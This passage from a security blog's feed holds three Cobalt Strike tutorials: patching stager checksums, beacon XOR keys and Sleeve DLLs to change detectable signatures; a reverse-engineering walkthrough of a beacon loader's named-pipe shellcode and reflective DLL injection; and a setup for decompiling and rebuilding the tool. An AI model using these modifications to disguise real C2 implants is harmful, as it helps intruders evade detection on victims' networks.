    <link href="http://www.ol4three.com/2021/11/23/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%81%E9%87%8F%E4%BF%AE%E6%94%B9/"/>
    <id>http://www.ol4three.com/2021/11/23/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%81%E9%87%8F%E4%BF%AE%E6%94%B9/</id>
    <published>2021-11-23T12:07:36.000Z</published>
    <updated>2021-11-26T07:18:22.841Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike特征修改"><a href="#CobaltStrike特征修改" class="headerlink" title="CobaltStrike特征修改"></a>CobaltStrike特征修改</h1><h2 id="修改Stager防止被直接扫描：修改位置如下"><a href="#修改Stager防止被直接扫描：修改位置如下" class="headerlink" title="修改Stager防止被直接扫描：修改位置如下"></a>修改Stager防止被直接扫描：修改位置如下</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cloudstrike&#x2F;webserver.java</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201537986.png" alt="image-20211123201537986"></p><p>修改isStager函数，只要不是92或者93就行。这里首先需要修改checksum8，将其返回值改为return sum</p><a id="more"></a><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201720257.png" alt="image-20211123201720257"></p><p>利用脚本来生成我们的返回值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    public static long checksum8(String text) &#123;</span><br><span class="line">        if (text.length() &lt; 4) &#123;</span><br><span class="line">            return 0L;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            text &#x3D; text.replace(&quot;&#x2F;&quot;, &quot;&quot;);</span><br><span class="line">            long sum &#x3D; 0L;</span><br><span class="line"></span><br><span class="line">            for(int x &#x3D; 0; x &lt; text.length(); ++x) &#123;</span><br><span class="line">                sum +&#x3D; (long)text.charAt(x);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return sum ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">    public static void main(String []args) &#123;</span><br><span class="line">        String key &#x3D; &quot;703e7b3b4e2a07715552e466e0d231bd&quot;;</span><br><span class="line">        long flag &#x3D; checksum8(key);</span><br><span class="line">        System.out.println(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key我们使用wings来生成md5，然后运行获取对应的值</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123202249235.png" alt="image-20211123202249235"></p><p>将我们值放入替换92L为2131L</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean isStager(String uri) &#123;</span><br><span class="line">   return checksum8(uri) &#x3D;&#x3D; 2131L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时修改return为我们生成的key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">common&#x2F;CommonUtils.java</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String MSFURI(int var0) &#123;</span><br><span class="line">   String[] var1 &#x3D; toArray(&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;);</span><br><span class="line"></span><br><span class="line">   StringBuffer var2;</span><br><span class="line">   do &#123;</span><br><span class="line">      var2 &#x3D; new StringBuffer(var0 + 1);</span><br><span class="line">      var2.append(&quot;&#x2F;&quot;);</span><br><span class="line"></span><br><span class="line">      for(int var3 &#x3D; 0; var3 &lt; var0; ++var3) &#123;</span><br><span class="line">         var2.append(pick(var1));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; while(checksum8(var2.toString()) !&#x3D; 2131L);</span><br><span class="line"></span><br><span class="line">   return &quot;703e7b3b4e2a07715552e466e0d231bd&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123202512901.png" alt="image-20211123202512901"></p><p>X64同理进行修改</p><p>之后修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&#x2F;BeaconPayload.java</span><br></pre></td></tr></table></figure><p>将异或值0x2e改为0x3e(默认显示为10进制，我们改为62即可)</p><blockquote><p>根据之前的特征信息我们可知</p><p>cs 3.x版本的配置信息是通过异或0x69解密出的，4.x版本的配置信息是通过异或0x2e解密出的。</p><p>至此，可以发现，从3.x到4.x，cs自解密的算法没变，自解密后再解密配置文件的算法就只是改了个密钥，而且是固定的（3.x 0x69，4.x 0x2e）。    </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static byte[] beacon_obfuscate(byte[] var0) &#123;</span><br><span class="line">   byte[] var1 &#x3D; new byte[var0.length];</span><br><span class="line"></span><br><span class="line">   for(int var2 &#x3D; 0; var2 &lt; var0.length; ++var2) &#123;</span><br><span class="line">      var1[var2] &#x3D; (byte)(var0[var2] ^ 62);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   return var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改DLL文件"><a href="#修改DLL文件" class="headerlink" title="修改DLL文件"></a>修改DLL文件</h2><p>同时我们需要到生成时调用的DLL文件进行修改，否则会导致异或值不一样导致的无法上线，下载解密的问题</p><p>使用脚本对Sleeve进行解密，具体原理可以查看CobaltStrike的认证流程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ca3tie1&#x2F;CrackSleeve</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123203240973.png" alt="image-20211123203240973"></p><p>将解密出来的文件拖到IDA，搜索0x2e关键字，打patch修改为0x3e</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123203454667.png" alt="image-20211123203454667"></p><p>同时需要修改的有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon.dll</span><br><span class="line">beacon.x64.dll</span><br><span class="line">dnsb.dll</span><br><span class="line">dnsb.x64.dll</span><br><span class="line">pivot.dll</span><br><span class="line">pivot.x64.dll</span><br></pre></td></tr></table></figure><p>将修改之后的dll放入并加密</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123204004260.png" alt="image-20211123204004260"></p><p>将之前修改的Java，和我们的dll 重新导入jar文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BeaconPayload.java</span><br><span class="line">Webserver.java</span><br><span class="line">commonutil.java</span><br></pre></td></tr></table></figure><p>进行测试上线，发现特征流量已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211124125228589.png" alt="image-20211124125228589"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cloud.tencent.com/developer/article/1764340">https://cloud.tencent.com/developer/article/1764340</a></p><p><a href="https://lengjibo.github.io/CobaltStrikeCode/">https://lengjibo.github.io/CobaltStrikeCode/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CobaltStrike特征修改&quot;&gt;&lt;a href=&quot;#CobaltStrike特征修改&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike特征修改&quot;&gt;&lt;/a&gt;CobaltStrike特征修改&lt;/h1&gt;&lt;h2 id=&quot;修改Stager防止被直接扫描：修改位置如下&quot;&gt;&lt;a href=&quot;#修改Stager防止被直接扫描：修改位置如下&quot; class=&quot;headerlink&quot; title=&quot;修改Stager防止被直接扫描：修改位置如下&quot;&gt;&lt;/a&gt;修改Stager防止被直接扫描：修改位置如下&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cloudstrike&amp;#x2F;webserver.java&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201537986.png&quot; alt=&quot;image-20211123201537986&quot;&gt;&lt;/p&gt;
&lt;p&gt;修改isStager函数，只要不是92或者93就行。这里首先需要修改checksum8，将其返回值改为return sum&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>CobaltSrike Shellcode分析</title>
    <link href="http://www.ol4three.com/2021/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike-Shellcode%E5%88%86%E6%9E%90/"/>
    <id>http://www.ol4three.com/2021/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike-Shellcode%E5%88%86%E6%9E%90/</id>
    <published>2021-11-12T09:11:01.000Z</published>
    <updated>2021-11-23T12:11:02.058Z</updated>
    
    <content type="html"><![CDATA[<p>首先我们来看一张流程图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201045600.png" alt="image-20211123201045600"></p><p>首先打开IDA进行查看</p><p>进入主函数，主要看sub_401840()函数进行查看</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112185819017.png" alt="image-20211112185819017"></p><p>进入函数发现，首先获取系统时间戳，然后拼接字符串和创建线程通过管道读取shellcode，最后执行shellcode</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114141830161.png" alt="image-20211114141830161"></p><a id="more"></a><p>拼接的管道名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004053F0&#x3D;artifact.004053F0 (ASCII &quot;\\.\pipe\MSSE-5866-server&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114142512415.png" alt="image-20211114142512415"></p><p>跟进线程创建线程执行的函数，首先创建命名管道，再把加密过的shellcode写入管道</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114143133792.png" alt="image-20211114143133792"></p><p>Shellcode内容</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114143858237.png" alt="image-20211114143858237"></p><p>写入shellcode</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150018919.png" alt="image-20211114150018919"></p><p>跟进接收shellcode函数RevShellcode_40172:其主题逻辑是先申请内存存放读取出来的shellcode，然后再解密执行</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150317625.png" alt="image-20211114150317625"></p><p>从管道中读取shellcode到内存中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150501720.png" alt="image-20211114150501720"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150714414.png" alt="image-20211114150714414"></p><p>将读取出来的Shellcode在DecyptandrRunShellcode_40158E函数中执行解密，该函数的主题逻辑，申请内存存放解密后的shellcode，然后修改内存属性并跳转运行</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151059974.png" alt="image-20211114151059974"></p><p>解密算法如下，首先遍历shellcode，遍历次数与4求模，得到的值作为403008数组的下标得到一字节，用该字节与shellcode对应遍历时的字节异或，最终得到解密后的字节</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151532706.png" alt="image-20211114151532706"></p><p>解密所需的数组</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151904493.png" alt="image-20211114151904493"></p><p>解密后的数据</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114152353437.png" alt="image-20211114152353437"></p><p>之后跳转并执行</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114152614378.png" alt="image-20211114152614378"></p><h1 id="Shellcode部分"><a href="#Shellcode部分" class="headerlink" title="Shellcode部分"></a>Shellcode部分</h1><p>先加载wininet.dll</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114161929815.png" alt="image-20211114161929815"></p><p>之后调用InternetOpen函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162309532.png" alt="image-20211114162309532"></p><p>连接控制端192.168.202.131</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162334075.png" alt="image-20211114162334075"></p><p>请求Beacon URL： /FXhV</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162518977.png" alt="image-20211114162518977"></p><p>发送HTTP请求</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174801303.png" alt="image-20211114174801303"></p><p>获取桌面窗口句柄</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174830200.png" alt="image-20211114174830200"></p><p>处理前面对话窗口遇到的错误</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114175616822.png" alt="image-20211114175616822"></p><p>申请内存</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174903855.png" alt="image-20211114174903855"></p><p>多次调用InternetReadFile读取文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174923492.png" alt="image-20211114174923492"></p><p>读取完成后跳转执行到所申请的内存</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114175016024.png" alt="image-20211114175016024"></p><p>这里需要解密出一个dll，具体的解密算法如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115122512735.png" alt="image-20211115122512735"></p><p>解密后的数据：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115163932049.png" alt="image-20211115163932049"></p><p>反射注入DLL：</p><p>查看解密出来的DLL</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115172616776.png" alt="image-20211115172616776"></p><p>0x36c0032 -&gt; 0x36c0041 也就是DLL的Dos头部分，下面ebx+0x8150，也是导出函数ReflectiveLoader函数的偏移</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115172820956.png" alt="image-20211115172820956"></p><p>在导出函数ReflectiveLoader函数中解析DLL，ReflectiveLoader中会调用virtualalloc()函数，申请大小为0x30000的内存，用于存放DLL：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173716075.png" alt="image-20211115173716075"></p><p>在内存中反射注入dll,存放在eax中0x3D15DA8</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173811388.png" alt="image-20211115173811388"></p><p>然后开始执行dll，此时也可以到自己的c2还没有主机上线</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173929114.png" alt="image-20211115173929114"></p><p>执行dll中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103030220.png" alt="image-20211116103030220"></p><p>获取对应的系统信息拼接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103131000.png" alt="image-20211116103131000"></p><p>获取cookie</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103241470.png" alt="image-20211116103241470"></p><p>获取配置信息</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103319764.png" alt="image-20211116103319764"></p><p>调用，wininet.HttpSendRequestA请求上线</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103445022.png" alt="image-20211116103445022"></p><p>上线回连</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103628751.png" alt="image-20211116103628751"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103533769.png" alt="image-20211116103533769"></p><p>对默认生成的shellcode分析发现存在大量的特征信息，导入配置文件后再次对shellcode进行分析，发现对应的关键信息已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115524286.png" alt="image-20211116115524286"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115534263.png" alt="image-20211116115534263"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115540028.png" alt="image-20211116115540028"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先我们来看一张流程图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201045600.png&quot; alt=&quot;image-20211123201045600&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先打开IDA进行查看&lt;/p&gt;
&lt;p&gt;进入主函数，主要看sub_401840()函数进行查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112185819017.png&quot; alt=&quot;image-20211112185819017&quot;&gt;&lt;/p&gt;
&lt;p&gt;进入函数发现，首先获取系统时间戳，然后拼接字符串和创建线程通过管道读取shellcode，最后执行shellcode&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114141830161.png&quot; alt=&quot;image-20211114141830161&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike二开环境初探</title>
    <link href="http://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/"/>
    <id>http://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/</id>
    <published>2021-11-09T03:12:55.000Z</published>
    <updated>2022-07-22T10:09:19.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们使用CobaltStrike的时候，进行性的需要进行二次开发，使其对应的功能更加丰富，更加方便我们团队联合进行渗透的稳定性和隐蔽性。</p><img src="https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/2.png" alt="2" style="zoom:50%;"><h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><blockquote><p><code>IntelliJ IDEA</code> 自带了一个反编译java的工具，有时候我们需要对 <code>cobaltstrike</code> 的整个 <code>jar</code> 包进行反编译，使用这个 <code>IntelliJ IDEA</code> 双击之类的反编译时要是对整个源码层面进行搜索并不是很方便，可使用其自带的反编译工具，可以做到批量的整个反编译。</p><p>这里先在 <code>IntelliJ IDEA</code> 安装目录找到 <code>java-decompiler.jar</code> 拷贝到一个准备好的目录，并且新建两个文件，一个 <code>cs_bin</code> 里面放未反编译的 <code>cobaltstrike</code> 再建一个 <code>cs_src</code> 文件，这个是空文件，是为了之后放反编译后的 <code>cobaltstrike</code></p></blockquote><a id="more"></a><p>在对应目录下进行拷贝</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;IntelliJ IDEA.app&#x2F;Contents&#x2F;plugins&#x2F;java-decompiler&#x2F;lib&#x2F;java-decompiler.jar</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109112414086.png" alt="image-20211109112414086"></p><p>进入到java-decompiler中找到decompiler的路径，提取出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;org&#x2F;jetbrains&#x2F;java&#x2F;decompiler&#x2F;IdeaDecompiler$LegalBurden.class</span><br></pre></td></tr></table></figure><p>将所有的反斜杠替换成.随之再其后加上ConsoleDecompilers，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.jetbrains.java.decompiler.IdeaDecompiler$LegalBurden.class.ConsoleDecompilers</span><br></pre></td></tr></table></figure><p>因为MANIFEST.MF中是没有main class属性，没有制定主类，所以不能直接使用<code>java -jar</code>，如果想要直接执行Java包中具体的类，要使用java -cp输入如下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br></pre></td></tr></table></figure><p>执行的时候会有提示</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br><span class="line">Usage: java -jar fernflower.jar [-&lt;option&gt;&#x3D;&lt;value&gt;]* [&lt;source&gt;]+ &lt;destination&gt;</span><br><span class="line">Example: java -jar fernflower.jar -dgs&#x3D;true c:\my\source\ c:\my.jar d:\decompiled\</span><br></pre></td></tr></table></figure><p>让你加上<code>-dgs=true</code>之后加上反编译的cobaltstrike和反编译之后要把结果放入的目录，输入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs&#x3D;true cs_bin&#x2F;cobaltstrike.jar cs_src&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109114350746.png" alt="image-20211109114350746"></p><p>反编译完成后，会自动打包成jar包，右键解压后打开可以看到都是.java了，反编译出来就可以直接放入IntelliJ IDEA中，可直接搜索代码和相关的代码交叉引用。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109114720498.png" alt="image-20211109114720498"></p><h1 id="IDEA二次开发环境构造"><a href="#IDEA二次开发环境构造" class="headerlink" title="IDEA二次开发环境构造"></a>IDEA二次开发环境构造</h1><p>打开IDEA选择Create New Project 一直选择Next，创建好后，先建立两个文件夹<code>decompiled_src</code>文件夹，之后再建立一个<code>lib</code>文件夹。将反编译好的CobaltStrike复制到decompiled_src中，然后把它解压出来</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120423523.png" alt="image-20211109120423523" style="zoom:50%;"><p>然后把原始的未反编译的CobaltStrike放到刚刚新建的lib中去</p><p>结下来我们要对这个项目进行设置，点击<code>File</code>中的<code>Project Structure</code>在<code>Modules</code>对<code>Dependencies</code>进行设置.</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120705932.png" alt="image-20211109120705932"></p><p>选择lib中的cobalt strike.jar， 确认是Compile之后勾选一下，然后选择Apply。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120959418.png" alt="image-20211109120959418"></p><p>依赖关系设置完成后，进入Artifacts——&gt;JAR——&gt;From modules with dependencies</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121200835.png" alt="image-20211109121200835"></p><p>这里需要填写一个Main Class，去lib中的META-INF里面双击MANIFEST.MF</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121328249.png" alt="image-20211109121328249"></p><p>复制aggressor.Aggressor，再次打开选择OK这里就设置完成了。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121447940.png" alt="image-20211109121447940"></p><p>接下来再decompiled_src中找到已经反编译完的aggressor主类，右键选择Refactor –Copy File</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122002190.png" alt="image-20211109122002190"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122051094.png" alt="image-20211109122051094"></p><p>在To directory点击添加，选择之前创建的src在其中提阿健一个aggressor名字要一致，最后点击OK</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122242765.png" alt="image-20211109122242765"></p><p>这样aggressor就自动的被拷贝到src目录里去了，这里可以看一下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109160037402.png" alt="image-20211109160037402"></p><p>试着修改一下文档，保存。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109160235084.png" alt="image-20211109160235084"></p><p>到这里我们基本的准备工作就完成了，之后我们需要修改哪个文件，就可以在完整的源码中找到那个文件，然后邮件Refactor后然Copy File到这个目录进行修改，修改完成之后就可以选Build–&gt;Build Artifacts–&gt;Build进行编译</p><p>当提示<code>Build completed successfully in 4 s 670 ms</code>会在out文件夹生成我们编译好的SecondC2.jar</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161214075.png" alt="image-20211109161214075"></p><p>在每次调试运行的时候，不需要切换到命令行环境，可以直接配置对应的参数如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161644494.png" alt="image-20211109161644494"></p><p>最后在Run中选择Run C2级可以看到消息窗口</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161624209.png" alt="image-20211109161624209" style="zoom:50%;"><p>点击确认，发现弹出提示，点击确定</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161817082.png" alt="image-20211109161817082"></p><p>拿出<code>-XX:+AggressuveHeap</code>复制并放到Run-&gt;Profile中的VM options中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162250841.png" alt="image-20211109162250841"></p><p>再次运行，再次复制<code>-XX:+UseParallelGC</code>继续添加到VM options中，记得要用空格隔开。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162419743.png" alt="image-20211109162419743"></p><p>再次运行，提示缺少.auth文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162720558.png" alt="image-20211109162720558"></p><p>这里把初始的cobaltstrike.auth文件复制到SecondC2.jar同目录下。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109163005947.png" alt="image-20211109163005947" style="zoom:33%;"><p>最后运行，就可以成功启动，接下来根据我们对应的需求，在项目中就行关键字搜索就可以定位到相关功能的代码处，从而进行相应的修改，或做一些功能上的增强。</p><p><a href="https://github.com/OL4THREE/Practice-Note/blob/main/CobaltStrike二开环境初探/SecondC2.zip">完整下载地址</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我们使用CobaltStrike的时候，进行性的需要进行二次开发，使其对应的功能更加丰富，更加方便我们团队联合进行渗透的稳定性和隐蔽性。&lt;/p&gt;
&lt;img src=&quot;https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/2.png&quot; alt=&quot;2&quot; style=&quot;zoom:50%;&quot;&gt;

&lt;h1 id=&quot;反编译&quot;&gt;&lt;a href=&quot;#反编译&quot; class=&quot;headerlink&quot; title=&quot;反编译&quot;&gt;&lt;/a&gt;反编译&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;IntelliJ IDEA&lt;/code&gt; 自带了一个反编译java的工具，有时候我们需要对 &lt;code&gt;cobaltstrike&lt;/code&gt; 的整个 &lt;code&gt;jar&lt;/code&gt; 包进行反编译，使用这个 &lt;code&gt;IntelliJ IDEA&lt;/code&gt; 双击之类的反编译时要是对整个源码层面进行搜索并不是很方便，可使用其自带的反编译工具，可以做到批量的整个反编译。&lt;/p&gt;
&lt;p&gt;这里先在 &lt;code&gt;IntelliJ IDEA&lt;/code&gt; 安装目录找到 &lt;code&gt;java-decompiler.jar&lt;/code&gt; 拷贝到一个准备好的目录，并且新建两个文件，一个 &lt;code&gt;cs_bin&lt;/code&gt; 里面放未反编译的 &lt;code&gt;cobaltstrike&lt;/code&gt; 再建一个 &lt;code&gt;cs_src&lt;/code&gt; 文件，这个是空文件，是为了之后放反编译后的 &lt;code&gt;cobaltstrike&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike特征隐藏与流量分析</title>
    <link href="http://www.ol4three.com/2021/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/Cobalt-Strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
